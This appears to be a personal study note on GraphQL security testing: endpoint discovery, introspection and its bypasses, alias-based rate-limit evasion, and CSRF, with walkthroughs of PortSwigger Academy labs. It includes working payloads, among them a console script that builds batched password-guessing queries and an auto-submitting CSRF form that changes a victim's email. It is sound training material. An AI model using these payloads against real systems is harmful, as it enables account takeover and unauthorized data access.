

GraphQL is an API query language , it defines a contract though which a client can communicate with a server. the client doesn't know where the data resides. instead clients send queries to a graphql server, which fetches data from the relevant place


## how it works

- queries fetch data
- mutations add, change or remove data
- subscriptions are similar to queries, but setup  permanent connection by which a server can proactively push data to a client in a specified format.



# Finding GraphQl 

first thing first  discover its endpoints


if we send `query{__typename}`  to any graphQL endpoint and in the response it includes `{"data": {"__typename":"query"`  this is useful in probing  a URL corresponds to a graphQL

## Common endpoints

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`



# POST finding 

best practice for producing graphQL is to only accept POST request that have content-type of `application/json`  howerver if it accept GET then the request will use `x-www-form-urlencoded` 



### Exploiting args


API can be using arguments to access objects directly  it may be vulnerable to access control vuln  like IDOR


### schema information

basically querying information about he schema , that best practice is to disacbile introspection in  the production environment  if this isnt the case then we can try an introspection request

```sql
`{ "query": "{__schema{queryType{name}}}" }`
```

is this could work we can go for a full scale introspection

```sql

`{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } onOperation #Often needs to be deleted to run query onFragment #Often needs to be deleted to run query onField #Often needs to be deleted to run query } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }`
```


always use **GraphQL visualizer** its used to take results of introspection and produce a visual rep of the returned data


# Bypass introspection 

- try inserting special character after the `__schema` 
-  you could use regex to exclude the `__schema` in queries , try space , new line , commas 
- try 
```
`{ "query": "query{__schema {queryType{name}}}" }`
```
- try another method  GET
```
`GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D`
```


# Bypass rate Limiting using Alias

objects in graphQL cant contain multiple properties using the same name  so they enable alias to bypass this restriction 

some alias are intended to limit the number of API calls you make  some  are used to prevent brute force attacks

- some rate limiter work in bases of number of http reqeusts recieved by the endpoint

```
`query isValidDiscount($code: Int) { isvalidDiscount(code:$code){ valid } isValidDiscount2:isValidDiscount(code:$code){ valid } isValidDiscount3:isValidDiscount(code:$code){ valid } }`
```



# GraphQL CSRF

CSRF is when an attacker induce users to perform actions what they do not intend to do  by for example foging a cross domain request to the vuln app

this can arise where a graphQL endpoint doesn not validate the content type of the request sent to it

`POST` use content type `application/json` for validation 

- use `GET` so it would convert the content type to `x-www-form-urlencoded` to bypass this validation 




# LABS
## Accessing private GraphQL posts



- find the graphQl queries in burp 
- try introspection  `{ "query": "{__schema{queryType{name}}}" }
- this has a result try the fullscale mode and visualize -> burp -> greaphql set introspecting 
- find a query and try idor and other vulns 

```graphql

    query getBlogPost($id: Int!) {
        getBlogPost(id: $id) {
            image
            title
            author
            date
            paragraphs
          postPassword -> added
        }
    }
```

``` variable 
{"id":3}
```



## Accidental exposure of private GraphQL fields


- set introspecter full
- save the graph in sitemap
- check sitemap and enum id




## Finding a hidden GraphQL endpoint


```
query{__schema
     {queryType{name}}}
```


- after trying the endpoint i found out that `/api` has a response of query not found
- its a `GET` so i tried this `GET /api?query=query%7b__schema%0a+++++%7bqueryType%7bname%7d%7d%7d`
- worked but in the graphql section  i saw it should be parsed in a specific order 
- like this 
```
query{__schema
     {queryType{name}}}
```

- where after schema should be `\n` 
- then after setting the full scale i adapted it to this format and it worked 
- save it to the sitemap
- get the user carlo
- then delete it in the delete orf user input 



## Bypassing GraphQL brute force protections

- use this script
```
``copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>` bruteforce$index:login(input:{password: "$password", username: "carlos"}) { token success } `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");``
```

paste it in the browser console and it will generate basically the parameter that we can place in the graphql for bypass bruteforce 


## Performing CSRF exploits over GraphQL

-  to convert the request into POST with `content-type` of `x-www-form-urencoded` change the request method TWICE
- take the graphql and URL encoded with the variable 

```
 query=
    mutation changeEmail($input: ChangeEmailInput!) {
        changeEmail(input: $input) {
            email
        }
    }
&operationName=changeEmail&variables={"input":{"email":"test@hacker.com"}}
```

url encode it and POC csrf

``` html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a860060033d5d0b80a62bc600540046.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="&#10;&#32;&#32;&#32;&#32;mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;email&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#10;&#32;&#32;&#32;&#32;&#125;&#10;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;a&#64;a&#46;com&quot;&#125;&#125;" />
      <input type="hidden" name="&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```